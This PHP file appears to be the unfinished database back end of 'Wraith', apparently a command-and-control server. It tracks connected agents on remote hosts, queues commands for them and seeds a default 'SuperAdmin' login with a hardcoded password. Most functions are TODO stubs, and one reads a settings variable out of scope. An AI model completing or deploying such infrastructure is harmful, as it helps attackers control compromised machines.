<?php

// SQLite database file location relative to API.php
$DATABASE_LOCATION = "./storage/wraithdb";

// Get a database instance
// This can be edited to use MySQL or equivalent databases. As long as
// there is a $db variable holding a PDO database connection
// all should work (untested).
$GLOBALS["db"] = new PDO("sqlite:" . $DATABASE_LOCATION);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Check whether the database is initialised
try {

    $db->query("SELECT * FROM DB_INIT_INDICATOR")->fetchAll();

} catch (PDOException $e) {

    // If not, prepare the database

    // SQL Commands to be executed to initialise the database
    $db_init_commands = [
        // Settings table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Settings` (
            `Key` TEXT,
            `Value` TEXT
        );",
        // Statistics table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Stats` (
            `Key` TEXT,
            `Value` TEXT
        );",
        // Connected Wraiths table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_ActiveWraiths` (
            `AssignedID` TEXT,
            `HostProperties` TEXT,
            `WraithProperties` TEXT,
            `LastHeartbeatTime` TEXT,
            `IssuedCommands` TEXT
        );",
        // Command queue table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_CommandsIssued` (
            `CommandID` TEXT,
            `CommandName` TEXT,
            `CommandParams` TEXT,
            `CommandTargets` TEXT,
            `CommandResponses` TEXT,
            `TimeIssued` TEXT
        );",
        // Users table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Users` (
            `UserID` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
            `UserName` TEXT,
            `UserPassword` TEXT,
            `UserPrivileges` TEXT
        );",
        // Create default settings entries
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'MarkOfflineDelay',
            '16'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'WraithInitialCryptKey',
            'QWERTYUIOPASDFGHJKLZXCVBNM'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'WraithSwitchCryptKey',
            'QWERTYUIOPASDFGHJKLZXCVBNM'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'APIFingerprint',
            'ABCDEFGHIJKLMNOP'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'DefaultCommand',
            ''
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'APIPrefix',
            'W_'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'RequestIPBlacklist',
            '[]'
        );",
        // Create a stats table entry
        "INSERT INTO `WraithAPI_Stats` VALUES (
            'DatabaseSetupAPIVersion',
            '" . API_VERSION . "'
        );",
        // Create a stats table entry
        "INSERT INTO `WraithAPI_Stats` VALUES (
            'DatabaseSetupTime',
            '" . time() . "'
        );",
        // Mark the database as initialised
        "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
            `DB_INIT_INDICATOR` INTEGER
        );"
    ]; // TODO: Set default of NoCrypt to 0

    // Execute the SQL queries to initialise the database
    foreach ($db_init_commands as $command) {

        $db->exec($command);

    }

}

// Set the global SETTINGS variable with the settings from the database
$settings_table = $db->query("SELECT * FROM WraithAPI_Settings");
$SETTINGS = [];
foreach ($settings_table as $table_row) {
    $SETTINGS[$table_row[0]] = $table_row[1];
}

// Check whether a user account exists
// There has to be a way to manage the API so if there are no users,
// create one.
try {

    $API_USERS = $db->query("SELECT * FROM WraithAPI_Users")->fetchAll();

    if (sizeof($API_USERS) == 0) {
        throw new Exception("");
    }

} catch (Exception $e) {

    // Create default super admin user

    $user_entry_creation_command = "INSERT INTO `WraithAPI_Users` (
        `UserName`,
        `UserPassword`,
        `UserPrivileges`
    ) VALUES (
        'SuperAdmin',
        '" . password_hash("SuperAdminPassword", PASSWORD_BCRYPT) . "',
        '2'
    );";

    $db->exec($user_entry_creation_command);

}

// Set the global API_USERS variable
$API_USERS = $db->query("SELECT * FROM WraithAPI_Users LIMIT 1")->fetchAll();

// Functions for database management

// WRAITH

// Add a Wraith to the database
function db_add_wraiths($data) {

    global $db;

    $statement = $db->prepare("INSERT INTO `WraithAPI_ActiveWraiths` (
        `AssignedID`,
        `HostProperties`,
        `WraithProperties`,
        `LastHeartbeatTime`,
        `IssuedCommands`
    ) VALUES (
        :AssignedID,
        :HostProperties,
        :WraithProperties,
        :LastHeartbeatTime,
        :IssuedCommands
    )");

    foreach ($data as $wraith) {

        // Bind the parameters in the query with variables
        $statement->bindParam(":AssignedID", $wraith["AssignedID"]);
        $statement->bindParam(":HostProperties", $wraith["HostProperties"]);
        $statement->bindParam(":WraithProperties", $wraith["WraithProperties"]);
        $statement->bindParam(":LastHeartbeatTime", $wraith["LastHeartbeatTime"]);
        $statement->bindParam(":IssuedCommands", $wraith["IssuedCommands"]);

        // Execute the statement to add a Wraith
        $statement->execute();

    }

}

// Remove a Wraith
function db_remove_wraiths($filters) {

    global $db;

    // TODO

}

// Check which Wraiths have not sent a heartbeat in the mark dead time and remove
// them from the database
function db_expire_wraiths() {

    global $db;

    // Remove all Wraith entries where the last heartbeat time is older than
    // the $SETTINGS["MarkOfflineDelay"]
    $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths`
        WHERE `LastHeartbeatTime` < :earliest_valid_heartbeat");
    $earliest_valid_heartbeat = time()-$SETTINGS["MarkOfflineDelay"];
    $statement->bindParam(":earliest_valid_heartbeat", $earliest_valid_heartbeat);
    $statement->execute();

}

// Get a list of Wraiths and their properties
function db_get_wraiths($filters) {

    global $db;

    // TODO

}

// COMMAND

// Issue a command to Wraith(s)
function db_issue_commands($data) {

    global $db;

    // TODO

}

// Delete a command from the command table
function db_cancel_commands($filters) {

    global $db;

    // TODO

}

// Get commands (all or filtered)
function db_get_commands($filters) {

    global $db;

    // TODO

}

// USERS & SETTINGS

// Edit an API setting
function db_edit_settings($data) {

    global $db;

    // TODO

}

// Create a new user
function db_add_users($data) {

    global $db;

    // TODO

}

// Change username
function db_change_user_name($data) {

    global $db;

    // TODO

}

// Change user password
function db_change_user_pass($data) {

    global $db;

    // TODO

}

// Change user privilege level (0=User, 1=Admin, 2=SuperAdmin)
function db_change_user_privilege($data) {

    global $db;

    // TODO

}

// STATS

// Update a statistic
function db_update_stats($data) {

    global $db;

    // TODO

}
